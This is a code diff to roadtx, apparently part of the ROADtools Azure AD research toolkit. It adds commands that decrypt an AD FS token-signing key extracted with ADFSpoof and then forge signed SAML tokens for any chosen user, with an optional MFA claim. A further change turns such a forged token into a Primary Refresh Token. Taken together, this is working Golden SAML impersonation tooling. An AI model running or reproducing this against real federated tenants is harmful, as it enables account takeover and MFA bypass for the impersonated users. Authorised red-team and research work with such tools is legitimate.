@@ -9,6 +9,7 @@ from urllib.parse import quote_plus
 from roadtools.roadlib.auth import Authentication, get_data, WELLKNOWN_CLIENTS, WELLKNOWN_RESOURCES
 from roadtools.roadlib.deviceauth import DeviceAuthentication
 from roadtools.roadtx.selenium import SeleniumAuthentication
+from roadtools.roadtx.federation import EncryptedPFX, SAMLSigner, encode_object_guid
 import pyotp
 
 RR_HELP = 'ROADtools Token eXchange by Dirk-jan Mollema (@_dirkjan) / Outsider Security (outsidersecurity.nl)'
@@ -74,6 +75,8 @@ def main():
     prt_parser.add_argument('-u', '--username', action='store', metavar='USER', help='User to authenticate')
     prt_parser.add_argument('-p', '--password', action='store', metavar='PASSWORD', help='Password')
     prt_parser.add_argument('-r', '--refresh-token', action='store', help='Refresh token')
+    prt_parser.add_argument('--saml-token', action='store', help='SAML token for federated auth (use value stdin to read from input)')
+
 
 
     prt_parser.add_argument('-f', '--prt-file', default="roadtx.prt", action='store', metavar='FILE', help='PRT storage file (to save or load in case of renewal)')
@@ -466,6 +469,30 @@ def main():
                                 action='store_true',
                                 help='Do not store tokens on disk, pipe to stdout instead')
 
+    # ADFS Encrypted blob decrypt
+    adfsdec_parser = subparsers.add_parser('decryptadfskey', help='Decrypt Encrypted PFX blob from ADFSpoof into PEM or PFX file')
+    adfsdec_parser.add_argument('-c', '--cert-pem', action='store', metavar='file', default='roadtx_adfs.pem', help='Certificate file to save ADFS cert (default: roadtx_adfs.pem)')
+    adfsdec_parser.add_argument('-k', '--key-pem', action='store', metavar='file', default='roadtx_adfs.key', help='Private key file to save ADFS key (default: roadtx_adfs.key)')
+    adfsdec_parser.add_argument('--cert-pfx', action='store', metavar='file', default='roadtx_adfs.pfx', help='File to store the key (default: roadtx_adfs.pfx)')
+    adfsdec_parser.add_argument('-o', '--output-format', action='store', metavar='format', default='pem', choices=['pem', 'pfx'], help='Output format (pem or pfx), default: pem')
+    adfsdec_parser.add_argument('encryptedpfx', action='store', metavar='pfxblob', help='EncryptedPFX data from ADFSpoof')
+    adfsdec_parser.add_argument('key', action='store', metavar='key', help='Decryption key (DKM key)')
+    adfsdec_parser.add_argument('-v', '--verbose', action='store_true', help='Show extra information')
+
+    # ADFS token generation
+    samltoken_parser = subparsers.add_parser('samltoken', help='Create a SAML token using an AD FS key')
+    samltoken_parser.add_argument('-c', '--cert-pem', action='store', metavar='file', help='Certificate file with AD FS cert')
+    samltoken_parser.add_argument('-k', '--key-pem', action='store', metavar='file', help='Private key file with AD FS key')
+    samltoken_parser.add_argument('--cert-pfx', action='store', metavar='file', help='PFX file with AD FS cert/key')
+    samltoken_parser.add_argument('--pfx-pass', action='store', metavar='password', help='PFX file password')
+    samltoken_parser.add_argument('--pfx-base64', action='store', metavar='BASE64', help='PFX file as base64 string')
+    samltoken_parser.add_argument('-i', '--issuer', action='store', required=True, help='Token issuer, must match the federated domain name (without http/https, example: federated.mycompany.com)')
+    samltoken_parser.add_argument('-u', '--unique-id', action='store', help='Unique ID of user to spoof (immutableId in roadrecon)')
+    samltoken_parser.add_argument('-g', '--guid', action='store', help='GUID of user to spoof (from AD), if not specifying the unique id')
+    samltoken_parser.add_argument('-m', '--mfa', action='store_true', help='Include MFA claim in token')
+    samltoken_parser.add_argument('--upn', action='store', required=True, help='userPrincipalName of user to spoof')
+
+
     if len(sys.argv) < 2:
         parser.print_help()
         sys.exit(1)
@@ -531,6 +558,12 @@ def main():
             prtdata = None
             if args.username and args.password:
                 prtdata = deviceauth.get_prt_with_password(args.username, args.password)
+            if args.saml_token:
+                if args.saml_token.lower() == 'stdin':
+                    samltoken = sys.stdin.read()
+                else:
+                    samltoken = args.saml_token
+                prtdata = deviceauth.get_prt_with_samltoken(samltoken)
             if args.refresh_token:
                 prtdata = deviceauth.get_prt_with_refresh_token(args.refresh_token)
 
@@ -858,6 +891,33 @@ def main():
             "fidoAttestationCertificates": []
         }
         print(json.dumps(data, sort_keys=True, indent=4))
+    elif args.command == 'decryptadfskey':
+        rawblob = base64.b64decode(args.encryptedpfx)
+        rawkey = binascii.unhexlify(args.key.replace('-',''))
+        pfx = EncryptedPFX(rawblob, rawkey, args.verbose)
+        decrypted_pfx = pfx.decrypt_pfx()
+        if args.output_format == 'pfx':
+            pfx.save_pfx(decrypted_pfx, args.cert_pfx)
+            print(f'Saved decrypted key to {args.cert_pfx}')
+        else:
+            pfx.save_pem(decrypted_pfx, args.cert_pem, args.key_pem)
+            print(f'Saved decrypted certificate to {args.cert_pem} and key to {args.key_pem}')
+    elif args.command == 'samltoken':
+        signer = SAMLSigner()
+        if not signer.loadcert(args.cert_pem, args.key_pem, args.cert_pfx, args.pfx_pass, args.pfx_base64):
+            sys.exit(1)
+        if not args.unique_id and not args.guid:
+            print('Either the unique-id or guid of the user to spoof is required')
+            sys.exit(1)
+        elif args.unique_id:
+            uid = args.unique_id
+        else:
+            uid = encode_object_guid(args.guid)
+        template, assertionid = signer.format_template(uid, args.upn, args.issuer, args.mfa)
+        signed = signer.sign_xml(template, assertionid)
+        print(signed.decode('utf-8'))
+
+
 
 if __name__ == '__main__':
     main()
